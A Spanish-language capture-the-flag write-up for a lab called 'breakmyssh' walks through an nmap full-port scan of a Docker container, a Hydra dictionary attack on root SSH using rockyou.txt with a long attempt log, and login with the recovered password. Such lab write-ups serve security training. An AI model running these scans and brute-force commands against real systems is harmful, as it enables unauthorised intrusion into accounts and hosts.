breakmyssh — Write-up y Comandos

Objetivo: Obtener acceso por SSH a un host de laboratorio (Docker) con credenciales débiles.
Alcance: Ambiente CTF/lab controlado. No usar contra sistemas sin autorización.

🧰 Requisitos

Kali Linux (o similar)

nmap ≥ 7.9x

hydra ≥ 9.x

Wordlist: rockyou.txt.gz (ubicado en /usr/share/wordlists/)

🔎 1) Recon: escaneo completo con Nmap

Comando ejecutado:
```shell
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

Qué hace cada parámetro:

-sV : detección de versión de servicios.

-C : (equivalente a -sC) scripts NSE por defecto para reconocimiento.

-p- : escanea todos los puertos TCP (1–65535).

-n : sin resolución DNS (más rápido).

--min-rate 5000 : mínimo ~5000 paquetes/seg (ideal en redes locales/labs).

Salida :

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 00:16 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000090s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.67 seconds
```

Conclusión: SSH abierto en 22/tcp con OpenSSH 7.7 → candidato a fuerza bruta si hay contraseña débil.

🪓 2) Ataque de credenciales: Hydra (usuario único)

Comando ejecutado:
```shell
hydra -l root -P /usr/share/wordlists/rockyou.txt.gz -t 8 -f -V -o hydra_out.txt ssh://172.17.0.2
```

Qué hace cada parámetro:

-l root : usuario a probar (único).
-P ...gz : wordlist comprimida (rockyou.txt.gz). Hydra la maneja directo.
-t 8 : 8 hilos (ajustar según recursos).
-f : detener al encontrar la primera credencial válida.
-V : verbose, muestra intentos.
-o file : guarda resultados en hydra_out.txt.
ssh://IP : objetivo/protocolo.

Evidencia (extracto):
```shell
dra_out.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-09 00:17:38
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[ATTEMPT] target 172.17.0.2 - login "root" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "12345678" - 9 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "abc123" - 10 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "nicole" - 11 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "daniel" - 12 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "babygirl" - 13 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "monkey" - 14 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "lovely" - 15 of 14344399 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "jessica" - 16 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "654321" - 17 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "michael" - 18 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "ashley" - 19 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "qwerty" - 20 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "111111" - 21 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "iloveu" - 22 of 14344399 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "000000" - 23 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "michelle" - 24 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "tigger" - 25 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "sunshine" - 26 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "chocolate" - 27 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "password1" - 28 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "soccer" - 29 of 14344399 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "anthony" - 30 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "friends" - 31 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "butterfly" - 32 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "purple" - 33 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "angel" - 34 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "jordan" - 35 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "liverpool" - 36 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "justin" - 37 of 14344399 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "loveme" - 38 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "fuckyou" - 39 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "123123" - 40 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "football" - 41 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "secret" - 42 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "andrea" - 43 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "carlos" - 44 of 14344399 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "jennifer" - 45 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "joshua" - 46 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "bubbles" - 47 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "1234567890" - 48 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "superman" - 49 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "hannah" - 50 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "amanda" - 51 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "loveyou" - 52 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "pretty" - 53 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "basketball" - 54 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "andrew" - 55 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "angels" - 56 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "tweety" - 57 of 14344399 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "flower" - 58 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "playboy" - 59 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "hello" - 60 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "elizabeth" - 61 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "hottie" - 62 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "tinkerbell" - 63 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "charlie" - 64 of 14344399 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "samantha" - 65 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "barbie" - 66 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "chelsea" - 67 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "lovers" - 68 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "teamo" - 69 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "jasmine" - 70 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "brandon" - 71 of 14344399 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "666666" - 72 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "shadow" - 73 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "melissa" - 74 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "eminem" - 75 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "matthew" - 76 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "robert" - 77 of 14344399 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "danielle" - 78 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "forever" - 79 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "family" - 80 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "jonathan" - 81 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "987654321" - 82 of 14344399 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "computer" - 83 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "whatever" - 84 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "dragon" - 85 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "vanessa" - 86 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "cookie" - 87 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "naruto" - 88 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "summer" - 89 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "sweety" - 90 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "spongebob" - 91 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "joseph" - 92 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "junior" - 93 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "softball" - 94 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "taylor" - 95 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "yellow" - 96 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "daniela" - 97 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "lauren" - 98 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "mickey" - 99 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "princesa" - 100 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "alexandra" - 101 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "alexis" - 102 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "jesus" - 103 of 14344399 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "estrella" - 104 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "miguel" - 105 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "william" - 106 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "thomas" - 107 of 14344399 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "beautiful" - 108 of 14344399 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "root" - pass "mylove" - 109 of 14344399 [child 7] (0/0)
[22][ssh] host: 172.17.0.2   login: root   password: estrella
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-09 00:17:41
```

Credenciales válidas encontradas: root:estrella

💡 Tip: Si tienes varios usuarios, usa -L users.txt. Controla el throttle con -t para no inestabilizar el servicio del lab.

🔐 3) Acceso por SSH y verificación

Comando ejecutado:
```shell
ssh root@172.17.0.2
```

Login interactivo (usar la contraseña encontrada). Tras acceder:
```shell
whoami
# -> root
```
Indicadores de contenedor: el prompt muestra algo como root@57d42f3a021f:~# (ID típico de Docker).

📎 Apéndice: Comandos tal cual se ejecutaron (con salidas)
Nma
```shell
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```
Salida (resumen) ya incluida en la sección 1.

Hydra
```shell
hydra -l root -P /usr/share/wordlists/rockyou.txt.gz -t 8 -f -V -o hydra_out.txt ssh://172.17.0.2
```
Extracto clave:

[22][ssh] host: 172.17.0.2   login: root   password: estrella

SSH + verificación
```shell
ssh root@172.17.0.2
whoami
# root
```
✅ Resultado

Servicio identificado: SSH (OpenSSH 7.7) en 172.17.0.2:22

Credenciales válidas: root:estrella (por diccionario)

Acceso: root dentro de contenedor Docker

Siguiente paso: localizar y capturar la flag (p. ej., /root/flag.txt) y documentar el flujo.
